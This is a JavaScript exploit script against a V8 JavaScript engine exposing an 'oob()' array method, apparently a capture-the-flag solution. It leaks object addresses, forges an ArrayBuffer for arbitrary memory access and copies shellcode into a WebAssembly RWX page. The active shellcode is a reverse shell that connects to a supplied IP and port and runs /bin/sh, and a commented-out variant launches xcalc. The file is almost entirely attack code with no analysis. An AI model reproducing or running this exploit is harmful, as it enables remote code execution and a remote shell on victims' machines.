/*
const shellcode = new Uint8Array([
	0x48, 0xb8, 0x2f, 0x78, 0x63, 0x61, 0x6c, 0x63,	0x00, 0x00, 0x50, 0x48, 0xb8, 0x2f, 0x75, 0x73,
	0x72, 0x2f, 0x62, 0x69, 0x6e, 0x50, 0x48, 0x89,	0xe7, 0x48, 0x31, 0xc0, 0x50, 0x57, 0x48, 0x89,
	0xe6, 0x48, 0x31, 0xd2, 0x48, 0xc7, 0xc0, 0x3a,	0x30, 0x00, 0x00, 0x50, 0x48, 0xb8, 0x44, 0x49,
	0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x50, 0x48,	0x89, 0xe2, 0x48, 0x31, 0xc0, 0x50, 0x52, 0x48,
	0x89, 0xe2, 0x48, 0xc7, 0xc0, 0x3b, 0x00, 0x00,	0x00, 0x0f, 0x05, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
]);
 */

var shellcode = new Uint8Array([
	0x48, 0x31, 0xc0, 0x48, 0x31, 0xff, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x6a,
	0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x6a, 0x06, 0x5a, 0x6a, 0x29, 0x58, 0x0f, 0x05, 0x49, 0x89, 0xc0,
	0x48, 0x31, 0xf6, 0x4d, 0x31, 0xd2, 0x41, 0x52, 0xc6, 0x04, 0x24, 0x02, 0x66, 0xc7, 0x44, 0x24,
	0x02,
	0xff, 0xff, // PORT [0x31-0x32]
	0xc7, 0x44, 0x24, 0x04,
	0xff, 0xff, 0xff, 0xff,  // IPADDR [0x37-0x3a]
	0x48, 0x89, 0xe6, 0x6a, 0x10, 
	0x5a, 0x41, 0x50, 0x5f, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x48, 0x31, 0xf6, 0x6a, 0x03, 0x5e, 0x48,
	0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6, 0x48, 0x31, 0xff, 0x57, 0x57, 0x5e, 0x5a,
	0x48, 0xbf, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xef, 0x08, 0x57, 0x54,
	0x5f, 0x6a, 0x3b, 0x58, 0x0f, 0x05, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
]);

const wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
    0x01, 0x85, 0x80, 0x80, 0x80, 0x00, 0x01, 0x60,
    0x00, 0x01, 0x7f, 0x03, 0x82, 0x80, 0x80, 0x80,
    0x00, 0x01, 0x00, 0x06, 0x81, 0x80, 0x80, 0x80,
    0x00, 0x00, 0x07, 0x85, 0x80, 0x80, 0x80, 0x00,
    0x01, 0x01, 0x61, 0x00, 0x00, 0x0a, 0x8a, 0x80,
    0x80, 0x80, 0x00, 0x01, 0x84, 0x80, 0x80, 0x80,
    0x00, 0x00, 0x41, 0x00, 0x0b
]);
let wasm_inst = new WebAssembly.Instance(new WebAssembly.Module(wasm_code), {});

let ab     = new ArrayBuffer(0x80)
let arr    = [1.1];
let victim = [ab];

let fake_obj = [ u2f(0xdeadbeef), 0, u2f(0xcafebabe), u2f(0xff00000000) ];
let leak     = [fake_obj, wasm_inst];

function exploit(addr, port){
	let PACKED_DOUBLE_ELEMENTS = arr.oob();
	let PACKED_ELEMENTS = victim.oob();
	console.log('[+] PACKED_DOUBLE_ELEMENTS : ', hex(PACKED_DOUBLE_ELEMENTS));
	console.log('[+] PACKED_ELEMENTS        : ', hex(PACKED_ELEMENTS));

	fake_obj[0] = PACKED_DOUBLE_ELEMENTS;

	leak.oob(PACKED_DOUBLE_ELEMENTS);
	let addr_fake_obj = f2u(leak[0])-1 + 0x70;
	console.log('[+] addr_fake_obj          : ', hex(addr_fake_obj));
	let addr_wasm_inst = f2u(leak[1])-1;
	console.log('[+] addr_wasm_inst         : ', hex(addr_wasm_inst));

	victim.oob(PACKED_DOUBLE_ELEMENTS);
	let addr_arraybuffer = f2u(victim[0])-1;
	console.log('[*] Tamper ArrayBuffer ', hex(addr_arraybuffer+1), ' -> ', hex(addr_fake_obj + 1));
	victim[0] = u2f(addr_fake_obj+1);
	victim.oob(PACKED_ELEMENTS);

	let buf = victim[0];
	fake_obj[2] = u2f(addr_wasm_inst+1 - 0x10);
	let addr_rwx = f2u(buf[0x11]);
	console.log('[+] addr_rwx               : ', hex(addr_rwx));

	fake_obj[2] = u2f(addr_arraybuffer+1 - 0x10);
	buf[4] = u2f(addr_rwx);

	let sc   = new DataView(shellcode.buffer);
	let view = new DataView(ab);
	sc.setUint16(0x31, port);
	sc.setUint32(0x37, ip2long(addr));
	for(let i = 0; i < shellcode.length; i++)
		view.setUint8(i, shellcode[i], true);

	let wasm_func = wasm_inst.exports.a;
	wasm_func();
}
